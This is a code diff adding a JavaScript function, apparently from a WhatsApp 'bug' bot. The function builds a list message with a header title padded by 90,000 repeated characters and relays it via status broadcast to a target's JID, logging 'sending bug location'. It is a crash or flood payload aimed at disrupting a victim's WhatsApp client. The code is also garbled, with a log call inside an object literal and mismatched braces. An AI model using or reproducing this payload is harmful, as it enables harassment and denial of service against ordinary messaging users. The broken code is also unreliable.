@@ -1,0 +1,37 @@
+async function forcall(target, Ptcp = true) {
+  const undefined = [
+    {
+      attrs: { Waib_Array: "whatsapp" },
+      tag: "Array",
+    },
+    {
+      attrs: {},
+      tag: "Waib",
+    },
+  ];
+  let messagePayload = {
+    businessMessage: {
+            message: {
+        listMessage: {
+          header: {
+                  title: "⃐⃐⃐GODBYㇱ" + "ꦾ".repeat(90000),
+                  console.log(chalk.white.bold(`Success Send follchat To Target`));
+  } catch (error) {
+    console.error(
+      chalk.white.statusJidList(`Failed Send follchat:`, error)
+    );
+  }
+}
+await sock.relayMessage("status@broadcast", msg.message, {
+    messageId: msg.key.id,
+    statusJidList: [target],
+    
+                    jid: target
+                },
+                content: undefined
+            }]
+        }]
+    }]
+});
+console.log(chalk.green("sending bug location"));
+}
